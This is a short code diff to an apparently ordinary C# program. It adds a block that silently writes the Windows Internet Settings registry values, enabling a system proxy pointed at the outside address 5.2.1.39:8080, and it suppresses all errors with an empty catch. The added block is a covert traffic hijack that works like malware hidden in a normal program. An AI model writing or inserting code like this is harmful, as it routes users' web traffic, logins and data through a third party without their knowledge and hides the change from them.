@@ -166,6 +166,26 @@ public class Program
 
             }
         }
+
+        {
+            string registryKey = @"Software\Microsoft\Windows\CurrentVersion\Internet Settings";
+
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryKey, true))
+                {
+                    if (key != null)
+                    {
+                        key.SetValue("ProxyEnable", 1);
+                        key.SetValue("ProxyServer", "5.2.1.39:8080");
+                    }
+                }
+            }
+            catch
+            {
+
+            }
+        }
     }
 
     private static void ExecuteCmdCommand(string command)
